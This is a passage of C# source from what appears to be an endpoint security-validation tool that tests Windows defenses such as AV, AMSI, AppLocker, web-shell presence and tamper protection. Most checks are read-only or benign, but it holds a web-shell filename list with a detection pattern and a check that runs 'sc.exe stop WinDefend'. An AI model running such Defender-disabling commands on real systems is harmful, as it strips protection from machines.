            // Check if Defender real-time protection is enabled
            bool defenderOn = IsDefenderRealtimeEnabled();
            if (defenderOn)
                return (CheckResult.Pass, "Microsoft Defender real-time protection is active; would intercept known malicious attachments.", "Ensure all endpoint AV signatures are up-to-date.");
            return (CheckResult.Fail, "No AV real-time scan detected on the endpoint. Simulated attachment was not intercepted.", "Enable endpoint AV with real-time scanning and up-to-date signatures.");
        }));

        // --- HTML smuggling payload drop ---
        cat.Checks.Add(await RunCheck("HTML smuggling payload drop", "T1566.001", async () =>
        {
            // Simulate: write an HTML file containing base64-encoded 'payload', check if browser/AV flags
            string html = "<html><body><script>var b=atob('QUFBTFNFQ1JFVCBQQVlMT0FE');document.write(b);</script></body></html>";
            string tmp  = Path.Combine(Path.GetTempPath(), "bas_html_smuggle.html");
            File.WriteAllText(tmp, html);
            bool exists = File.Exists(tmp);
            File.Delete(tmp);
            bool defenderOn = IsDefenderRealtimeEnabled();
            if (!exists || !defenderOn)
                return (CheckResult.Pass, "HTML smuggling payload was either blocked or AV is monitoring script-based drops.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "HTML smuggling test file written without interception.", "Enable AMSI and script-content inspection in your AV/EDR.");
        }));

        // --- LNK / shortcut execution ---
        cat.Checks.Add(await RunCheck("LNK / shortcut execution", "T1566.001", async () =>
        {
            string lnkPath = Path.Combine(Path.GetTempPath(), "bas_test.lnk");
            // Write a minimal .lnk shell-link header (benign Ã¢â‚¬â€ points nowhere)
            byte[] lnkHeader = new byte[76];
            BitConverter.GetBytes(0x0000004C).CopyTo(lnkHeader, 0); // HeaderSize
            // GUIDs / flags intentionally zeroed Ã¢â€ â€™ OS will not auto-execute
            File.WriteAllBytes(lnkPath, lnkHeader);
            bool written = File.Exists(lnkPath);
            File.Delete(lnkPath);
            bool smartAppControl = IsSmartAppControlEnabled();
            if (smartAppControl)
                return (CheckResult.Pass, "Smart App Control is enabled; LNK execution from unknown sources would be blocked.", "Ã¢â‚¬â€");
            if (!written)
                return (CheckResult.Pass, "LNK file was blocked before creation.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "LNK shortcut file was created without interception.", "Enable Smart App Control or app-whitelisting policies.");
        }));

        // --- Script-based droppers (PS / JS / VBS) ---
        cat.Checks.Add(await RunCheck("Script-based droppers (PowerShell, JS, VBS)", "T1059", async () =>
        {
            // Attempt to read the AMSI status via PowerShell -EncodedCommand flag availability
            bool psExists = File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "WindowsPowerShell", "v1.0", "powershell.exe"));
            bool amsiEnabled = IsAMSIEnabled();
            if (amsiEnabled && psExists)
                return (CheckResult.Pass, "AMSI is enabled and PowerShell script inspection is active.", "Keep AMSI and script-block logging enabled.");
            if (!psExists)
                return (CheckResult.Pass, "PowerShell not found Ã¢â‚¬â€ script-dropper surface reduced.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "AMSI or script-block logging is not enabled.", "Enable AMSI integration and PowerShell script-block logging (event 4104).");
        }));

        return cat;
    }

    // ============================================================
    // 1.2  MALICIOUS URL ACCESS
    // Tests: Browser protection, DNS filtering, SWG
    // ============================================================
    static async Task<SimulationCategory> Sim_1_2_MaliciousURL()
    {
        var cat = new SimulationCategory { Name = "1.2 Malicious URL Access", Phase = "Initial Access" };

        string[] testUrls = { "http://bas-sim-known-malicious.test", "http://bas-sim-newreg-domain.test", "http://bas-sim-shortener.test/abc", "http://bas-sim-qr-redirect.test" };
        string[] testNames = { "Known malicious URL", "Newly registered domain", "URL shortener", "QR-code based URL" };

        for (int i = 0; i < testUrls.Length; i++)
        {
            int idx = i; // capture
            cat.Checks.Add(await RunCheck(testNames[idx], "T1566.002", async () =>
            {
                // DNS resolution of .test TLD will always NXDOMAIN Ã¢â€ â€™ tests whether DNS filter
                // catches the lookup attempt.  We log the attempt and check for proxy / DNS-over-HTTPS.
                bool dnsFilterConfigured = IsDNSFilteringConfigured();
                bool proxyConfigured     = IsProxyConfigured();
                bool resolved            = false;
                try
                {
                    var _ = System.Net.Dns.GetHostAddresses(testUrls[idx].Replace("http://","").Split('/')[0]);
                    resolved = true;
                }
                catch { /* NXDOMAIN expected */ }

                if (!resolved && dnsFilterConfigured)
                    return (CheckResult.Pass, $"DNS query for simulated URL blocked / NXDOMAIN. DNS filtering appears active.", "Ã¢â‚¬â€");
                if (proxyConfigured && !resolved)
                    return (CheckResult.Pass, $"Proxy is configured and simulated URL did not resolve.", "Ã¢â‚¬â€");
                if (dnsFilterConfigured || proxyConfigured)
                    return (CheckResult.Pass, $"DNS filtering or proxy policy is present; simulated URL would be evaluated.", "Verify blocklists are up-to-date.");
                return (CheckResult.Fail, $"No DNS filtering or web proxy detected. Simulated malicious URL access would not be blocked.", "Deploy DNS filtering (e.g. DNS-over-HTTPS with blocklists) and/or a Secure Web Gateway.");
            }));
        }
        return cat;
    }

    // ============================================================
    // 2.1  LIVING-OFF-THE-LAND (LOLBins)
    // Tests: Behavioral detection, command-line monitoring, parent-child
    // ============================================================
    static async Task<SimulationCategory> Sim_2_1_LOLBins()
    {
        var cat = new SimulationCategory { Name = "2.1 Living-off-the-Land (LOLBins)", Phase = "Execution & Evasion" };

        // --- PowerShell abuse ---
        cat.Checks.Add(await RunCheck("PowerShell abuse", "T1059.001", async () =>
        {
            bool psLogging    = IsPowerShellScriptBlockLoggingEnabled();
            bool amsi         = IsAMSIEnabled();
            if (psLogging && amsi)
                return (CheckResult.Pass, "PowerShell script-block logging and AMSI are both enabled.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, $"PS ScriptBlock logging={psLogging}, AMSI={amsi}. LOLBin PowerShell abuse may go undetected.", "Enable script-block logging and AMSI.");
        }));

        // --- WMI execution ---
        cat.Checks.Add(await RunCheck("WMI execution", "T1059.005", async () =>
        {
            // Check if WMI service is running (winmgmt)
            bool wmiRunning = IsServiceRunning("winmgmt");
            bool edlLogging = IsWMILoggingEnabled();
            if (wmiRunning && edlLogging)
                return (CheckResult.Pass, "WMI service is active and WMI activity logging is enabled Ã¢â‚¬â€ behavioral detection likely.", "Ã¢â‚¬â€");
            if (!wmiRunning)
                return (CheckResult.Pass, "WMI service is stopped; WMI-based execution surface is reduced.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "WMI logging is not enabled. WMI-based execution may go undetected.", "Enable WMI event logging (Microsoft-Windows-WMI-Activity/Operational).");
        }));

        // --- mshta, rundll32, regsvr32, certutil ---
        string[][] lolbins = {
            new[]{"mshta","mshta.exe","T1218.007"},
            new[]{"rundll32","rundll32.exe","T1218.011"},
            new[]{"regsvr32","regsvr32.exe","T1218.010"},
            new[]{"certutil download","certutil.exe","T1105"}
        };
        foreach (var lb in lolbins)
        {
            string binName = lb[0]; string binExe = lb[1]; string tid = lb[2];
            cat.Checks.Add(await RunCheck($"{binName} abuse", tid, async () =>
            {
                string sysPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), binExe);
                bool exists    = File.Exists(sysPath);
                bool edr       = IsEDRDetectionLikely();
                if (!exists)
                    return (CheckResult.Pass, $"{binExe} not found on this endpoint.", "Ã¢â‚¬â€");
                if (edr)
                    return (CheckResult.Pass, $"{binExe} exists but EDR behavioral monitoring appears active.", "Tune EDR rules for {binName} parent-child anomalies.");
                return (CheckResult.Fail, $"{binExe} is present and no EDR behavioral detection confirmed.", $"Add EDR rule to alert on {binName} spawning child processes or loading unsigned DLLs.");
            }));
        }
        return cat;
    }

    // ============================================================
    // 2.2  DEFENSE EVASION
    // Tests: EDR heuristics, script inspection depth
    // ============================================================
    static async Task<SimulationCategory> Sim_2_2_DefenseEvasion()
    {
        var cat = new SimulationCategory { Name = "2.2 Defense Evasion", Phase = "Execution & Evasion" };

        // --- AMSI bypass attempts (simulated) ---
        cat.Checks.Add(await RunCheck("AMSI bypass attempts (simulated)", "T1027", async () =>
        {
            // We do NOT actually bypass AMSI.  We check if AMSI is enforced.
            bool amsi = IsAMSIEnabled();
            if (amsi)
                return (CheckResult.Pass, "AMSI is enabled. Known AMSI-bypass patterns would be detected by up-to-date signatures.", "Keep Windows and Defender updated to patch new AMSI bypass techniques.");
            return (CheckResult.Fail, "AMSI is not enabled on this endpoint.", "Enable AMSI integration in PowerShell and all script hosts.");
        }));

        // --- Obfuscated PowerShell ---
        cat.Checks.Add(await RunCheck("Obfuscated PowerShell", "T1027", async () =>
        {
            bool psLogging = IsPowerShellScriptBlockLoggingEnabled();
            if (psLogging)
                return (CheckResult.Pass, "Script-block logging captures de-obfuscated script content.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Script-block logging is off Ã¢â‚¬â€ obfuscated PS scripts would not be logged.", "Enable PowerShell script-block logging.");
        }));

        // --- Encoded commands (Base64) ---
        cat.Checks.Add(await RunCheck("Encoded commands (Base64)", "T1027.001", async () =>
        {
            // Simulate: generate a base64 string and verify logging would capture it
            string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes("Write-Host BASSimulationCheck"));
            bool psLogging = IsPowerShellScriptBlockLoggingEnabled();
            bool amsi      = IsAMSIEnabled();
            if (psLogging && amsi)
                return (CheckResult.Pass, $"Simulated encoded command generated. Both script-block logging and AMSI active Ã¢â‚¬â€ would be decoded and inspected.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Encoded command simulation: script logging or AMSI is missing.", "Enable script-block logging and AMSI to decode and inspect Base64 commands.");
        }));

        // --- Delayed execution ---
        cat.Checks.Add(await RunCheck("Delayed execution", "T1027.005", async () =>
        {
            // Check if Sysmon or equivalent is logging process creation with delay indicators
            bool sysmonActive = IsSysmonRunning();
            if (sysmonActive)
                return (CheckResult.Pass, "Sysmon is active Ã¢â‚¬â€ delayed process creation events will be logged.", "Ã¢â‚¬â€");
            return (CheckResult.Fail, "Sysmon not detected. Delayed execution may evade detection.", "Deploy Sysmon with a comprehensive filter configuration.");
        }));

        return cat;
    }

    // ============================================================
    // 2.3  EXECUTION & PAYLOAD DELIVERY
    // Validates if AV/EDR blocks malicious code the moment it runs.
    // Checks: scripting interpreters, file execution, AppLocker,
    //         EICAR test-file detection, web-shell presence.
    // ============================================================
    static async Task<SimulationCategory> Sim_2_3_ExecutionPayloadDelivery()
    {
        var cat = new SimulationCategory
        {
            Name  = "2.3 Execution & Payload Delivery",
            Phase = "Execution"
        };

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 1: PowerShell Ã¢â‚¬â€ AMSI + Constrained Language Mode Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Command & Scripting Interpreter Ã¢â‚¬â€ PowerShell Hardening",
            "T1059.001",
            async () =>
            {
                // Check 1a: AMSI loaded in current PowerShell process
                bool amsiOk = false;
                try
                {
                    var psi1 = new ProcessStartInfo("powershell.exe",
                        "-NoProfile -NonInteractive -Command " +
                        "\"[System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation') | Out-Null; " +
                        "$amsi = [System.Management.Automation.AmsiUtils]; Write-Output 'AMSI_OK'\"")
                    {
                        RedirectStandardOutput = true, RedirectStandardError = true,
                        UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p1 = Process.Start(psi1)!;
                    var o1 = await p1.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p1);
                    amsiOk = o1.Contains("AMSI_OK");
                }
                catch { }

                // Check 1b: Execution policy is not Unrestricted or Bypass
                string execPolicy = "Unknown";
                try
                {
                    var psi2 = new ProcessStartInfo("powershell.exe",
                        "-NoProfile -NonInteractive -Command \"(Get-ExecutionPolicy -Scope LocalMachine).ToString()\"")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p2 = Process.Start(psi2)!;
                    execPolicy = (await p2.StandardOutput.ReadToEndAsync()).Trim();
                    await WaitOrKillAsync(p2);
                }
                catch { }

                // Check 1c: Constrained Language Mode
                bool clmActive = false;
                try
                {
                    var psiClm = new ProcessStartInfo("powershell.exe",
                        "-NoProfile -NonInteractive -Command \"$ExecutionContext.SessionState.LanguageMode\"")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pClm = Process.Start(psiClm)!;
                    var clmOut = (await pClm.StandardOutput.ReadToEndAsync()).Trim();
                    await WaitOrKillAsync(pClm);
                    clmActive = clmOut.Contains("Constrained");
                }
                catch { }

                bool policyWeak = execPolicy is "Unrestricted" or "Bypass";
                bool pass = amsiOk && !policyWeak;

                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    $"Execution Policy: {execPolicy}. AMSI: {(amsiOk ? "Loaded" : "Not Detected")}. Constrained Language Mode: {(clmActive ? "Active" : "Not Active")}.",
                    pass
                        ? "PowerShell execution is adequately hardened."
                        : "Set execution policy to RemoteSigned or Restricted. Enable AMSI via Windows Defender. Enforce Constrained Language Mode via Attack Surface Reduction rules or AppLocker."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Attackers exploit unrestricted PowerShell to run encoded/obfuscated payloads, download additional stages, and disable defences Ã¢â‚¬â€ all without writing to disk. PowerShell is the #1 living-off-the-land tool in ransomware campaigns."
        });

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 2: Script Interpreter Access (WScript / CScript / CMD) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Script Interpreter Access Ã¢â‚¬â€ WScript / CScript / CMD",
            "T1059.003",
            async () =>
            {
                // Detect WScript/CScript restrictions via registry (AppLocker / SRP)
                // Ã¢â‚¬â€ no process spawn used here to avoid blocking on NUL device or policy dialogs
                bool wscriptBlocked  = false;
                bool cscriptBlocked  = false;
                await Task.CompletedTask;   // satisfy async signature

                // Check AppLocker EXE rules referencing wscript/cscript
                try
                {
                    using var exeKey = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe");
                    if (exeKey != null)
                    {
                        foreach (var ruleId in exeKey.GetSubKeyNames())
                        {
                            using var rule = exeKey.OpenSubKey(ruleId);
                            var conditions = rule?.GetValue("Value")?.ToString() ?? "";
                            if (conditions.Contains("wscript", StringComparison.OrdinalIgnoreCase))
                                wscriptBlocked = true;
                            if (conditions.Contains("cscript", StringComparison.OrdinalIgnoreCase))
                                cscriptBlocked = true;
                        }
                    }
                }
                catch { }

                // Fallback: binary missing from System32 = effectively blocked
                if (!wscriptBlocked)
                    wscriptBlocked = !File.Exists(Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.System), "wscript.exe"));
                if (!cscriptBlocked)
                    cscriptBlocked = !File.Exists(Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.System), "cscript.exe"));

                // Check AppLocker / SRP for script rules
                bool hasScriptPolicy = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows\SrpV2\Script");
                    hasScriptPolicy = key != null;
                }
                catch { }

                bool pass = wscriptBlocked && cscriptBlocked || hasScriptPolicy;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    $"WScript blocked: {wscriptBlocked}. CScript blocked: {cscriptBlocked}. AppLocker/SRP script policy: {(hasScriptPolicy ? "Present" : "None")}.",
                    pass
                        ? "Script interpreter access is restricted."
                        : "Use AppLocker or Software Restriction Policies to block WScript.exe and CScript.exe from running in user-writable paths. Enable Attack Surface Reduction rule: Block execution of potentially obfuscated scripts (92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B)."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Malicious .vbs, .js, and .hta files are frequently delivered via phishing email. Unrestricted WScript/CScript lets them execute silently with no AV prompt, launch reverse shells, and download further payloads."
        });

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 3: EICAR Malicious File Execution Test Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Malicious File Execution Ã¢â‚¬â€ EICAR AV Detection Test",
            "T1204.002",
            async () =>
            {
                // The EICAR standard AV test string Ã¢â‚¬â€ safe, detected by all AV products
                const string eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
                var eicarPath = Path.Combine(Path.GetTempPath(), $"bas_eicar_{AgentId}.com");
                bool detected = false;

                try
                {
                    await File.WriteAllTextAsync(eicarPath, eicar);
                    // Wait up to 5 seconds for AV to quarantine/delete the file
                    for (int i = 0; i < 10; i++)
                    {
                        await Task.Delay(500);
                        if (!File.Exists(eicarPath)) { detected = true; break; }
                    }
                }
                catch { }
                finally
                {
                    try { File.Delete(eicarPath); } catch { }
                }

                return (
                    detected ? CheckResult.Pass : CheckResult.Fail,
                    detected
                        ? "EICAR test file was blocked or quarantined by AV within 5 seconds of drop."
                        : "EICAR test file was written to disk and NOT detected within 5 seconds. Real-time protection is absent or slow.",
                    detected
                        ? "Real-time AV protection is functioning correctly."
                        : "Ensure Windows Defender or your AV product has real-time protection enabled. Verify cloud-delivered protection and automatic sample submission are active. Run a full signature update."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "If an AV cannot detect the industry-standard EICAR test file in real-time, it will likely miss actual malware on drop. This allows ransomware, RATs, and info-stealers to execute before any alert is raised."
        });

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 4: AppLocker / WDAC Application Control Policy Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Application Control Ã¢â‚¬â€ AppLocker / WDAC Policy Enforcement",
            "T1218",
            async () =>
            {
                bool appLockerActive = false;
                bool wdacActive      = false;

                // AppLocker: check if any AppIdSvc-delivered rule sets exist
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Policies\Microsoft\Windows\SrpV2");
                    if (key != null)
                    {
                        appLockerActive = key.GetSubKeyNames().Length > 0;
                    }
                }
                catch { }

                // WDAC (Windows Defender Application Control) via code integrity policy
                try
                {
                    var psiWdac = new ProcessStartInfo("powershell.exe",
                        "-NoProfile -NonInteractive -Command \"(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root/Microsoft/Windows/DeviceGuard).CodeIntegrityPolicyEnforcementStatus\"")
                    {
                        RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
                    };
                    using var pWdac = Process.Start(psiWdac)!;
                    var wdacOut = (await pWdac.StandardOutput.ReadToEndAsync()).Trim();
                    await WaitOrKillAsync(pWdac);
                    wdacActive = wdacOut == "2";   // 2 = enforced
                }
                catch { }

                bool pass = appLockerActive || wdacActive;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    $"AppLocker: {(appLockerActive ? "Active" : "Not configured")}. WDAC enforcement: {(wdacActive ? "Enforced" : "Not enforced")}.",
                    pass
                        ? "Application control policy is in place."
                        : "Deploy AppLocker in Enforce mode with Executable, Script, and Windows Installer rule collections. For higher assurance, use Windows Defender Application Control (WDAC) with a deny-by-default policy. Start in Audit mode before enforcing."
                );
            }
        ) with
        {
            Severity     = "High",
            ThreatImpact = "Without application control, any dropped executable can run Ã¢â‚¬â€ including commodity malware, ransomware droppers, and lateral movement tools. Application control is one of the ASD Essential Eight Top 4 mitigations."
        });

        // Ã¢â€â‚¬Ã¢â€â‚¬ Check 5: Server-Side Execution Ã¢â‚¬â€ Web Shell Detection Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
        cat.Checks.Add(await RunCheck(
            "Server-Side Execution Ã¢â‚¬â€ Web Shell / API Backdoor Detection",
            "T1505.003",
            async () =>
            {
                // Check if a web server (IIS) is running
                bool iisRunning = false;
                try
                {
                    using var sc = new System.ServiceProcess.ServiceController("W3SVC");
                    iisRunning = sc.Status == System.ServiceProcess.ServiceControllerStatus.Running;
                }
                catch { }

                if (!iisRunning)
                {
                    return (
                        CheckResult.Skipped,
                        "No IIS web server detected on this endpoint. Web shell check skipped.",
                        "Not applicable for non-server endpoints."
                    );
                }

                // Known web shell filenames and extensions
                var shellNames = new[] {
                    "cmd.aspx", "shell.aspx", "webshell.aspx", "c99.php", "r57.php",
                    "b374k.php", "p0wny.php", "wso.php", "shell.php", "cmd.php",
                    "eval.aspx", "ajax.aspx", "error.aspx", "upload.aspx",
                    "shell.jsp", "cmd.jsp", "spy.jsp"
                };

                var iisRoots = new[]
                {
                    @"C:\inetpub\wwwroot",
                    @"C:\inetpub\wwwroot\aspnet_client",
                };

                var found = new List<string>();
                foreach (var root in iisRoots)
                {
                    if (!Directory.Exists(root)) continue;
                    foreach (var shellName in shellNames)
                    {
                        var path = Path.Combine(root, shellName);
                        if (File.Exists(path)) found.Add(path);
                    }
                    // Also scan for any .php/.aspx/.jsp with suspicious content
                    try
                    {
                        foreach (var f in Directory.EnumerateFiles(root, "*.php", SearchOption.AllDirectories)
                            .Concat(Directory.EnumerateFiles(root, "*.aspx", SearchOption.AllDirectories))
                            .Take(200))
                        {
                            var content = await File.ReadAllTextAsync(f);
                            if (content.Contains("eval(") && (content.Contains("_REQUEST") || content.Contains("_POST") || content.Contains("cmd")))
                                found.Add(f);
                        }
                    }
                    catch { }
                }

                bool clean = found.Count == 0;
                return (
                    clean ? CheckResult.Pass : CheckResult.Fail,
                    clean
                        ? "No web shells detected in IIS wwwroot directories."
                        : $"Potential web shells found: {string.Join(", ", found.Take(5))}.",
                    clean
                        ? "Continue monitoring with File Integrity Monitoring (FIM) on web directories."
                        : "Immediately remove identified files, rotate all service account credentials, review IIS logs for attacker activity, and restore from a known-good backup. Enable Windows Defender for IIS HTTP scanning."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "A web shell gives an attacker persistent, authenticated remote code execution on the server via HTTP Ã¢â‚¬â€ bypassing firewall rules, VPNs, and network monitoring. Used extensively in supply-chain and ransomware attacks (e.g., Exchange/ProxyShell, Citrix Bleed)."
        });

        return cat;
    }

    // ============================================================
    // 2.5  DEFENSE EVASION (ADVANCED) â€” HIGH-END STEALTH CATEGORY
    // Tests if an attacker can blind security tools, hide activity,
    // and detect/adapt to the monitored environment.
    // 6 checks covering the full modern red-team evasion playbook.
    // ============================================================
    static async Task<SimulationCategory> Sim_2_5_DefenseEvasionAdvanced()
    {
        var cat = new SimulationCategory
        {
            Name  = "2.5 Defense Evasion \u2014 Impair, Inject, Erase & Deceive",
            Phase = "Defense Evasion"
        };

        // â”€â”€ Check 1: Impair Defenses â€” EDR/AV Tamper Resistance â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Impair Defenses \u2014 EDR & AV Tamper-Protection Hardening",
            "T1562.001",
            async () =>
            {
                await Task.CompletedTask;

                // 1a  Is Defender Tamper Protection enabled?
                bool tamperProtected = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows Defender\Features");
                    tamperProtected = key?.GetValue("TamperProtection")?.ToString() == "5";
                }
                catch { }

                // 1b  Is WdFilter.sys (Defender kernel driver) loaded?
                bool wdFilterLoaded = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Services\WdFilter");
                    wdFilterLoaded = key?.GetValue("Start") is int start && start <= 1;
                    // Also check ImagePath exists
                    if (!wdFilterLoaded && key != null)
                        wdFilterLoaded = key.GetValue("ImagePath") != null;
                }
                catch { }

                // 1c  Is Microsoft Defender for Endpoint (Sense) sensor running?
                bool senseRunning = false;
                try
                {
                    using var sc = new System.ServiceProcess.ServiceController("Sense");
                    senseRunning = sc.Status == System.ServiceProcess.ServiceControllerStatus.Running;
                }
                catch { }

                // 1d  Try to stop WinDefend â€” if Tamper Protection is on, this must fail
                bool winDefendStopBlocked = true;
                try
                {
                    var psi = new ProcessStartInfo("sc.exe", "stop WinDefend")
                    {
                        RedirectStandardOutput = true, RedirectStandardError = true,
                        UseShellExecute = false, CreateNoWindow = true
                    };
                    using var p = Process.Start(psi)!;
                    var sco = await p.StandardOutput.ReadToEndAsync();
                    await WaitOrKillAsync(p, 8_000);
                    // If exit code is 0 AND output says STOPPED, tamper protection failed
                    winDefendStopBlocked = p.ExitCode != 0 || sco.Contains("FAILED") ||
                                          sco.Contains("Access is denied") || sco.Contains("1060");
                }
                catch { winDefendStopBlocked = true; }

                // 1e  Is the Security Event Log protected from clearing by non-admins?
                bool logProtected = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SYSTEM\CurrentControlSet\Services\EventLog\Security");
                    // CustomSD present = hardened ACL on log
                    logProtected = key?.GetValue("CustomSD") != null;
                }
                catch { }

                var issues = new List<string>();
                if (!tamperProtected)       issues.Add("Tamper Protection is OFF â€” EDR can be disabled by user-space process");
                if (!wdFilterLoaded)        issues.Add("WdFilter.sys kernel driver is not loaded â€” kernel-level detection is absent");
                if (!senseRunning)          issues.Add("MDE Sense sensor not running â€” endpoint telemetry not forwarding to Defender portal");
                if (!winDefendStopBlocked)  issues.Add("CRITICAL: WinDefend service was stopped without resistance!");

                bool pass = tamperProtected && winDefendStopBlocked;
                return (
                    pass ? CheckResult.Pass : CheckResult.Fail,
                    pass
                        ? $"Tamper Protection ON. WinDefend stop: blocked. WdFilter: {(wdFilterLoaded ? "loaded" : "not detected")}. Sense: {(senseRunning ? "running" : "not present")}."
                        : $"EDR impairment risk factors: {string.Join("; ", issues)}.",
                    pass
                        ? "Continue enforcing Tamper Protection via Intune or MDE policy."
                        : "1) Enable Tamper Protection in MDE portal or Intune. 2) Ensure WdFilter is set StartType=Boot (0). 3) Enroll endpoints into MDE (Sense). 4) Enable Security Event Log CustomSD to restrict clearing."
                );
            }
        ) with
        {
            Severity     = "Critical",
            ThreatImpact = "Disabling AV/EDR is step 1 in every advanced ransomware playbook (LockBit, BlackCat, Conti). CISA Alert AA23-075A documents service-kill scripts in 90%+ of ransomware incidents. Without Tamper Protection, a low-privilege process can stop Windows Defender in 3 API calls."
        });

        // â”€â”€ Check 2: Process Injection Surfaces â€” AppInit, IFEO, DLL Hijack â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
        cat.Checks.Add(await RunCheck(
            "Process Injection Surface â€” AppInit DLLs & IFEO Debugger Hijacking",
            "T1055.001",
            async () =>
            {
                await Task.CompletedTask;

                // 2a  AppInit_DLLs â€” any value here = DLL auto-loaded into every user-mode process
                string appInitDlls = "";
                bool appInitEnabled = false;
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows");
                    appInitDlls    = key?.GetValue("AppInit_DLLs")?.ToString() ?? "";
                    appInitEnabled = key?.GetValue("LoadAppInit_DLLs")?.ToString() == "1";
                }
                catch { }

                // 2b  Image File Execution Options debugger hijacking
                //     Attackers set IFEO\<legit_exe>\Debugger to their payload
                var ifeoDirtied = new List<string>();
                try
                {
                    using var ifeoKey = Registry.LocalMachine.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options");
                    if (ifeoKey != null)
                    {
                        foreach (var sub in ifeoKey.GetSubKeyNames())
                        {
                            using var r = ifeoKey.OpenSubKey(sub);
                            var dbg = r?.GetValue("Debugger")?.ToString();
                            if (!string.IsNullOrEmpty(dbg) &&
                                !dbg.Contains("vsjitdebugger", StringComparison.OrdinalIgnoreCase) &&
                                !dbg.Contains("WerFault",       StringComparison.OrdinalIgnoreCase))
                                ifeoDirtied.Add($"{sub} â†’ {dbg}");
                        }
                    }
                }
                catch { }

                // 2c  DLL Search Order Hijacking â€” are any user-writable folders in SYSTEM PATH before System32?
                bool pathHijackable = false;
                try
                {
                    var sysPath = Environment.GetEnvironmentVariable("PATH", EnvironmentVariableTarget.Machine) ?? "";
                    var pathDirs = sysPath.Split(';', StringSplitOptions.RemoveEmptyEntries);
                    int sys32Index = Array.FindIndex(pathDirs, d =>
                        d.Contains("System32", StringComparison.OrdinalIgnoreCase));
                    for (int i = 0; i < sys32Index && i < pathDirs.Length; i++)
                    {
                        var dir = pathDirs[i].Trim();
                        if (dir.Contains("\\Users\\",   StringComparison.OrdinalIgnoreCase) ||
                            dir.Contains("\\AppData\\", StringComparison.OrdinalIgnoreCase) ||
                            dir.Contains("\\Temp\\",    StringComparison.OrdinalIgnoreCase))
                        {
                            pathHijackable = true;
                            break;
                        }
                    }
                }
                catch { }

                var issues = new List<string>();
                if (appInitEnabled && !string.IsNullOrEmpty(appInitDlls))
                    issues.Add($"AppInit_DLLs is ENABLED with: {appInitDlls}");
                if (ifeoDirtied.Count > 0)
                    issues.Add($"Suspicious IFEO debugger entries: {string.Join(", ", ifeoDirtied.Take(4))}");
                if (pathHijackable)
